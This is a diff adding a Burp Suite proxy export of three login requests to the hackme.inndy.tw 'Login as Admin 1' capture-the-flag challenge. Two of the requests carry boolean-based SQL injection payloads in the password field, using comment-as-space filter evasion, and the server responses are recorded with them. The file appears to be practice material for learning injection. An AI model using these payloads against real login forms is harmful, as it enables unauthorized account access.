@@ -1,0 +1,286 @@
+<?xml version="1.1"?>
+<!-- NOTE: Any NULL bytes in requests and responses are preserved within this output, even though this strictly breaks the XML syntax. If your XML parser rejects the NULL bytes then you will need to remove or replace these bytes before parsing. Alternatively, you can use the option to base64-encode requests and responses. -->
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ATTLIST items exportTime CDATA "">
+<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT url (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT port (#PCDATA)>
+<!ELEMENT protocol (#PCDATA)>
+<!ELEMENT method (#PCDATA)>
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT extension (#PCDATA)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT status (#PCDATA)>
+<!ELEMENT responselength (#PCDATA)>
+<!ELEMENT mimetype (#PCDATA)>
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT comment (#PCDATA)>
+]>
+<items burpVersion="1.7.35" exportTime="Sun May 19 16:06:03 CST 2019">
+  <item>
+    <time>Sun May 19 16:04:38 CST 2019</time>
+    <url><![CDATA[https://hackme.inndy.tw/login1/]]></url>
+    <host ip="140.118.126.236">hackme.inndy.tw</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/login1/]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /login1/ HTTP/1.1
+Host: hackme.inndy.tw
+Connection: close
+Content-Length: 25
+Cache-Control: max-age=0
+Origin: https://hackme.inndy.tw
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: https://hackme.inndy.tw/login1/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+name=guest&password=guest]]></request>
+    <status>200</status>
+    <responselength>1389</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 19 May 2019 08:04:39 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Strict-Transport-Security: max-age=15768000
+Content-Length: 1192
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login As Admin 1</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/bootstrap/css/bootstrap.min.css" media="all">
+</head>
+<body>
+    <div class="jumbotron">
+        <div class="container">
+            <h1>Login as Admin 1</h1>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="navbar">
+            <div class="container-fluid">
+                <div class="navbar-header">
+                    <a class="navbar-brand" href="/">Please Hack Me</a>
+                </div>
+                <ul class="nav navbar-nav">
+                    <li>
+                        <a href="/scoreboard">Scoreboard</a>
+                    </li>
+                    <li>
+                        <a href="?show_source=1" target="_blank">Source Code</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="col-md-6 col-md-offset-3">
+            <h3>Hi, guest</h3>
+
+            <h4>You are not admin!</h4>
+
+                    </div>
+    </div>
+</body>
+</html>
+]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun May 19 16:05:15 CST 2019</time>
+    <url><![CDATA[https://hackme.inndy.tw/login1/]]></url>
+    <host ip="140.118.126.236">hackme.inndy.tw</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/login1/]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /login1/ HTTP/1.1
+Host: hackme.inndy.tw
+Connection: close
+Content-Length: 42
+Cache-Control: max-age=0
+Origin: https://hackme.inndy.tw
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: https://hackme.inndy.tw/login1/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+name=guest&password=guest\'/**/or/**/2=2;#]]></request>
+    <status>200</status>
+    <responselength>1389</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 19 May 2019 08:05:16 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Strict-Transport-Security: max-age=15768000
+Content-Length: 1192
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login As Admin 1</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/bootstrap/css/bootstrap.min.css" media="all">
+</head>
+<body>
+    <div class="jumbotron">
+        <div class="container">
+            <h1>Login as Admin 1</h1>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="navbar">
+            <div class="container-fluid">
+                <div class="navbar-header">
+                    <a class="navbar-brand" href="/">Please Hack Me</a>
+                </div>
+                <ul class="nav navbar-nav">
+                    <li>
+                        <a href="/scoreboard">Scoreboard</a>
+                    </li>
+                    <li>
+                        <a href="?show_source=1" target="_blank">Source Code</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="col-md-6 col-md-offset-3">
+            <h3>Hi, guest</h3>
+
+            <h4>You are not admin!</h4>
+
+                    </div>
+    </div>
+</body>
+</html>
+]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun May 19 16:05:28 CST 2019</time>
+    <url><![CDATA[https://hackme.inndy.tw/login1/]]></url>
+    <host ip="140.118.126.236">hackme.inndy.tw</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/login1/]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /login1/ HTTP/1.1
+Host: hackme.inndy.tw
+Connection: close
+Content-Length: 42
+Cache-Control: max-age=0
+Origin: https://hackme.inndy.tw
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: https://hackme.inndy.tw/login1/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+name=guest&password=guest\'/**/or/**/1=2;#]]></request>
+    <status>200</status>
+    <responselength>2199</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 19 May 2019 08:05:29 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Strict-Transport-Security: max-age=15768000
+Content-Length: 2002
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login As Admin 1</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/bootstrap/css/bootstrap.min.css" media="all">
+</head>
+<body>
+    <div class="jumbotron">
+        <div class="container">
+            <h1>Login as Admin 1</h1>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="navbar">
+            <div class="container-fluid">
+                <div class="navbar-header">
+                    <a class="navbar-brand" href="/">Please Hack Me</a>
+                </div>
+                <ul class="nav navbar-nav">
+                    <li>
+                        <a href="/scoreboard">Scoreboard</a>
+                    </li>
+                    <li>
+                        <a href="?show_source=1" target="_blank">Source Code</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="col-md-6 col-md-offset-3">
+            <div class="alert alert-danger">Login failed</div>
+            <form action="." method="POST">
+                <div class="form-group">
+                    <label for="name">User:</label>
+                    <input id="name" class="form-control" type="text" name="name" placeholder="User">
+                </div>
+                <div class="form-group">
+                    <label for="password">Pass:</label>
+                    <input id="password" class="form-control" type="text" name="password" placeholder="Password">
+                </div>
+                <div class="form-group">
+                    <input class="form-control btn btn-primary" type="submit" value="Login">
+                </div>
+            </form>
+
+            <div>
+                <p>
+                    You can login with <code>guest</code> / <code>guest</code>.
+                </p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+]]></response>
+    <comment></comment>
+  </item>
+</items>
